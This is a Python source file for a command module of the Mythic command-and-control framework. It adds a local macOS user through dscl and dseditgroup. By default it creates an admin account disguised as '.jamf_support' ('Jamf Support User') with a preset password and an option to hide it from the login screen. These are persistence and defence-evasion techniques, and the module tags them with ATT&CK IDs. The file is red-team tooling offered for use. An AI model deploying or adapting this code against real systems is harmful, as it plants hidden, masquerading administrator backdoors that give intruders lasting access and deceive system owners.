from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class AddUserArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="New Password",
                name="password",
                type=ParameterType.String,
                description="p@55w0rd_here for new user",
                default_value="p@55w0rd_here",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    ui_position=4
                )]
            ),
            CommandParameter(
                display_name="Authenticate with this password",
                name="passwd",
                type=ParameterType.Credential_JSON,
                description="password of the user that will execute the commands",
                parameter_group_info=[ParameterGroupInfo(
                    ui_position=2
                )]
            ),
            CommandParameter(
                display_name="Authenticate as this user",
                name="user",
                type=ParameterType.Credential_JSON,
                description="username that will execute the commands",
                parameter_group_info=[ParameterGroupInfo(
                    ui_position=1
                )]
            ),
            CommandParameter(
                name="createprofile",
                type=ParameterType.Boolean,
                default_value=False,
                description="create a user profile or not",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="usershell",
                type=ParameterType.String,
                description="which shell environment should the new user have",
                default_value="/bin/bash",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    ui_position=5
                )]
            ),
            CommandParameter(
                name="primarygroupid",
                type=ParameterType.Number,
                description="POSIX primary group id for the new account",
                default_value=80,
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="uniqueid",
                type=ParameterType.Number,
                default_value=403,
                description="POSIX unique id for the user",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="homedir",
                type=ParameterType.String,
                description="/Users/.jamf_support",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="realname",
                type=ParameterType.String,
                default_value="Jamf Support User",
                description="Full user name",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                display_name="New Username",
                name="username",
                type=ParameterType.String,
                default_value=".jamf_support",
                description="POSIX username for account",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    ui_position=3
                )]
            ),
            CommandParameter(
                name="hidden",
                type=ParameterType.Boolean,
                default_value=False,
                description="Should the account be hidden from the logon screen",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="admin",
                type=ParameterType.Boolean,
                default_value=True,
                description="Should the account be an admin account",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class AddUserCommand(CommandBase):
    cmd = "add_user"
    needs_admin = True
    help_cmd = "add_user"
    description = "Add a local user to the system by wrapping the Apple binary, dscl."
    version = 2
    author = "@its_a_feature_"
    argument_class = AddUserArguments
    attackmapping = ["T1136", "T1136.001", "T1548.004", "T1564.002"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if task.args.get_arg("hidden"):
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="dscl . create /Users/{} IsHidden 1".format(task.args.get_arg("user")),
                artifact_type="Process Create",
            )
        else:
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="dscl . create /Users/{}".format(task.args.get_arg("user")),
                artifact_type="Process Create",
            )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} UniqueID {}".format(
                task.args.get_arg("user"),
                task.args.get_arg("uniqueid")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} PrimaryGroupID {}".format(
                task.args.get_arg("user"),
                task.args.get_arg("primarygroupid")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} NFSHomeDirectory \"{}\"".format(
                task.args.get_arg("user"),
                task.args.get_arg("homedir")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} RealName \"{}\"".format(
                task.args.get_arg("user"),
                task.args.get_arg("realname")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} UserShell {}".format(
                task.args.get_arg("user"),
                task.args.get_arg("usershell")
            ),
            artifact_type="Process Create",
        )
        if task.args.get_arg("admin"):
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="dseditgroup -o edit -a {} -t user admin".format(task.args.get_arg("user")),
                artifact_type="Process Create",
            )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . passwd /Users/{} \"{}\"".format(
                task.args.get_arg("user"),
                task.args.get_arg("password")
            ),
            artifact_type="Process Create",
        )
        if task.args.get_arg("createprofile"):
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="mkdir \"{}\"".format(task.args.get_arg("homedir")),
                artifact_type="Process Create",
            )
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="cp -R \"/System/Library/User Template/English.lproj/\" \"{}\"".format(
                    task.args.get_arg("homedir")
                ),
                artifact_type="Process Create",
            )
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="chown -R {}:staff \"{}\"".format(
                    task.args.get_arg("user"),
                    task.args.get_arg("homedir")
                ),
                artifact_type="Process Create",
            )
        task.args.add_arg("passwd", task.args.get_arg("passwd")["credential"])
        task.args.add_arg("user", task.args.get_arg("user")["account"])
        return task

    async def process_response(self, response: AgentResponse):
        pass
